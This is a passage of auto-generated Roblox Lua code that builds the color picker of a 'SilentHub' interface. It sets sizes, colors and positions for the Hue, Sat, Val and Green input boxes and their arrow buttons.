G2L["68"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue
G2L["69"] = Instance.new("Frame", G2L["5a"]);
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["69"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["69"]["Position"] = UDim2.new(1, -180, 0, 211);
G2L["69"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["69"]["Name"] = [[Hue]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input
G2L["6a"] = Instance.new("TextBox", G2L["69"]);
G2L["6a"]["Name"] = [[Input]];
G2L["6a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6a"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["6a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["6a"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["6a"]["Text"] = [[0]];
G2L["6a"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame
G2L["6b"] = Instance.new("Frame", G2L["6a"]);
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["6b"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["6b"]["Name"] = [[ArrowFrame]];
G2L["6b"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up
G2L["6c"] = Instance.new("TextButton", G2L["6b"]);
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["TextSize"] = 14;
G2L["6c"]["AutoButtonColor"] = false;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["BackgroundTransparency"] = 1;
G2L["6c"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["6c"]["Text"] = [[]];
G2L["6c"]["Name"] = [[Up]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow
G2L["6d"] = Instance.new("Frame", G2L["6c"]);
G2L["6d"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["6d"]["Name"] = [[Arrow]];
G2L["6d"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow.Frame
G2L["6e"] = Instance.new("Frame", G2L["6d"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["6e"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["6e"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow.Frame
G2L["6f"] = Instance.new("Frame", G2L["6d"]);
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["6f"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["6f"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["6f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Up.Arrow.Frame
G2L["70"] = Instance.new("Frame", G2L["6d"]);
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["70"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["70"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["70"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down
G2L["71"] = Instance.new("TextButton", G2L["6b"]);
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["TextSize"] = 14;
G2L["71"]["AutoButtonColor"] = false;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["71"]["BackgroundTransparency"] = 1;
G2L["71"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["71"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["71"]["Text"] = [[]];
G2L["71"]["Name"] = [[Down]];
G2L["71"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow
G2L["72"] = Instance.new("Frame", G2L["71"]);
G2L["72"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["72"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["72"]["Name"] = [[Arrow]];
G2L["72"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow.Frame
G2L["73"] = Instance.new("Frame", G2L["72"]);
G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["73"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["73"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["73"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow.Frame
G2L["74"] = Instance.new("Frame", G2L["72"]);
G2L["74"]["BorderSizePixel"] = 0;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["74"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["74"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["74"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Input.ArrowFrame.Down.Arrow.Frame
G2L["75"] = Instance.new("Frame", G2L["72"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["75"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["75"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["75"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Hue.Title
G2L["76"] = Instance.new("TextLabel", G2L["69"]);
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["76"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["76"]["Text"] = [[Hue:]];
G2L["76"]["Name"] = [[Title]];
G2L["76"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat
G2L["77"] = Instance.new("Frame", G2L["5a"]);
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["77"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["77"]["Position"] = UDim2.new(1, -180, 0, 233);
G2L["77"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["77"]["Name"] = [[Sat]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input
G2L["78"] = Instance.new("TextBox", G2L["77"]);
G2L["78"]["Name"] = [[Input]];
G2L["78"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["78"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["78"]["TextSize"] = 14;
G2L["78"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["78"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["78"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["78"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["78"]["Text"] = [[0]];
G2L["78"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame
G2L["79"] = Instance.new("Frame", G2L["78"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["79"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["79"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["79"]["Name"] = [[ArrowFrame]];
G2L["79"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up
G2L["7a"] = Instance.new("TextButton", G2L["79"]);
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["AutoButtonColor"] = false;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["BackgroundTransparency"] = 1;
G2L["7a"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["7a"]["Text"] = [[]];
G2L["7a"]["Name"] = [[Up]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow
G2L["7b"] = Instance.new("Frame", G2L["7a"]);
G2L["7b"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["7b"]["Name"] = [[Arrow]];
G2L["7b"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow.Frame
G2L["7c"] = Instance.new("Frame", G2L["7b"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7c"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["7c"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow.Frame
G2L["7d"] = Instance.new("Frame", G2L["7b"]);
G2L["7d"]["BorderSizePixel"] = 0;
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7d"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["7d"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Up.Arrow.Frame
G2L["7e"] = Instance.new("Frame", G2L["7b"]);
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7e"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["7e"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down
G2L["7f"] = Instance.new("TextButton", G2L["79"]);
G2L["7f"]["BorderSizePixel"] = 0;
G2L["7f"]["TextSize"] = 14;
G2L["7f"]["AutoButtonColor"] = false;
G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7f"]["BackgroundTransparency"] = 1;
G2L["7f"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["7f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["7f"]["Text"] = [[]];
G2L["7f"]["Name"] = [[Down]];
G2L["7f"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow
G2L["80"] = Instance.new("Frame", G2L["7f"]);
G2L["80"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["80"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["80"]["Name"] = [[Arrow]];
G2L["80"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow.Frame
G2L["81"] = Instance.new("Frame", G2L["80"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["81"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["81"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["81"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow.Frame
G2L["82"] = Instance.new("Frame", G2L["80"]);
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["82"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["82"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["82"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Input.ArrowFrame.Down.Arrow.Frame
G2L["83"] = Instance.new("Frame", G2L["80"]);
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["83"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["83"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["83"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Sat.Title
G2L["84"] = Instance.new("TextLabel", G2L["77"]);
G2L["84"]["TextSize"] = 14;
G2L["84"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["84"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["84"]["BackgroundTransparency"] = 1;
G2L["84"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["84"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["84"]["Text"] = [[Sat:]];
G2L["84"]["Name"] = [[Title]];
G2L["84"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val
G2L["85"] = Instance.new("Frame", G2L["5a"]);
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["85"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["85"]["Position"] = UDim2.new(1, -180, 0, 255);
G2L["85"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["85"]["Name"] = [[Val]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input
G2L["86"] = Instance.new("TextBox", G2L["85"]);
G2L["86"]["Name"] = [[Input]];
G2L["86"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["86"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["86"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["86"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["86"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["86"]["Text"] = [[255]];
G2L["86"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame
G2L["87"] = Instance.new("Frame", G2L["86"]);
G2L["87"]["BorderSizePixel"] = 0;
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["87"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["87"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["87"]["Name"] = [[ArrowFrame]];
G2L["87"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up
G2L["88"] = Instance.new("TextButton", G2L["87"]);
G2L["88"]["BorderSizePixel"] = 0;
G2L["88"]["TextSize"] = 14;
G2L["88"]["AutoButtonColor"] = false;
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["BackgroundTransparency"] = 1;
G2L["88"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["88"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["88"]["Text"] = [[]];
G2L["88"]["Name"] = [[Up]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow
G2L["89"] = Instance.new("Frame", G2L["88"]);
G2L["89"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["89"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["89"]["Name"] = [[Arrow]];
G2L["89"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow.Frame
G2L["8a"] = Instance.new("Frame", G2L["89"]);
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8a"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["8a"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow.Frame
G2L["8b"] = Instance.new("Frame", G2L["89"]);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8b"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["8b"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Up.Arrow.Frame
G2L["8c"] = Instance.new("Frame", G2L["89"]);
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8c"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["8c"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down
G2L["8d"] = Instance.new("TextButton", G2L["87"]);
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextSize"] = 14;
G2L["8d"]["AutoButtonColor"] = false;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8d"]["Text"] = [[]];
G2L["8d"]["Name"] = [[Down]];
G2L["8d"]["Position"] = UDim2.new(0, 0, 0, 8);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow
G2L["8e"] = Instance.new("Frame", G2L["8d"]);
G2L["8e"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["8e"]["Name"] = [[Arrow]];
G2L["8e"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow.Frame
G2L["8f"] = Instance.new("Frame", G2L["8e"]);
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["8f"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["8f"]["Position"] = UDim2.new(0, 8, 0, 5);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow.Frame
G2L["90"] = Instance.new("Frame", G2L["8e"]);
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["90"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["90"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["90"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Input.ArrowFrame.Down.Arrow.Frame
G2L["91"] = Instance.new("Frame", G2L["8e"]);
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["91"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["91"]["Position"] = UDim2.new(0, 6, 0, 3);
G2L["91"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Val.Title
G2L["92"] = Instance.new("TextLabel", G2L["85"]);
G2L["92"]["TextSize"] = 14;
G2L["92"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["92"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["92"]["BackgroundTransparency"] = 1;
G2L["92"]["Size"] = UDim2.new(0, 34, 1, 0);
G2L["92"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["92"]["Text"] = [[Val:]];
G2L["92"]["Name"] = [[Title]];
G2L["92"]["Position"] = UDim2.new(0, -40, 0, 0);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green
G2L["93"] = Instance.new("Frame", G2L["5a"]);
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["93"]["Size"] = UDim2.new(0, 52, 0, 16);
G2L["93"]["Position"] = UDim2.new(1, -63, 0, 233);
G2L["93"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["93"]["Name"] = [[Green]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input
G2L["94"] = Instance.new("TextBox", G2L["93"]);
G2L["94"]["Name"] = [[Input]];
G2L["94"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["94"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["94"]["TextSize"] = 14;
G2L["94"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["94"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["Size"] = UDim2.new(0, 50, 0, 16);
G2L["94"]["Position"] = UDim2.new(0, 2, 0, 0);
G2L["94"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["94"]["Text"] = [[0]];
G2L["94"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame
G2L["95"] = Instance.new("Frame", G2L["94"]);
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["Size"] = UDim2.new(0, 16, 1, 0);
G2L["95"]["Position"] = UDim2.new(1, -16, 0, 0);
G2L["95"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["95"]["Name"] = [[ArrowFrame]];
G2L["95"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up
G2L["96"] = Instance.new("TextButton", G2L["95"]);
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["TextSize"] = 14;
G2L["96"]["AutoButtonColor"] = false;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["BackgroundTransparency"] = 1;
G2L["96"]["Size"] = UDim2.new(1, 0, 0, 8);
G2L["96"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["96"]["Text"] = [[]];
G2L["96"]["Name"] = [[Up]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow
G2L["97"] = Instance.new("Frame", G2L["96"]);
G2L["97"]["Size"] = UDim2.new(0, 16, 0, 8);
G2L["97"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["97"]["Name"] = [[Arrow]];
G2L["97"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow.Frame
G2L["98"] = Instance.new("Frame", G2L["97"]);
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["98"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["98"]["Position"] = UDim2.new(0, 8, 0, 3);
G2L["98"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow.Frame
G2L["99"] = Instance.new("Frame", G2L["97"]);
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["99"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["99"]["Position"] = UDim2.new(0, 7, 0, 4);
G2L["99"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Up.Arrow.Frame
G2L["9a"] = Instance.new("Frame", G2L["97"]);
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9a"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["9a"]["Position"] = UDim2.new(0, 6, 0, 5);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Green.Input.ArrowFrame.Down
G2L["9b"] = Instance.new("TextButton", G2L["95"]);
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["TextSize"] = 14;
G2L["9b"]["AutoButtonColor"] = false;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9b"]["BackgroundTransparency"] = 1;
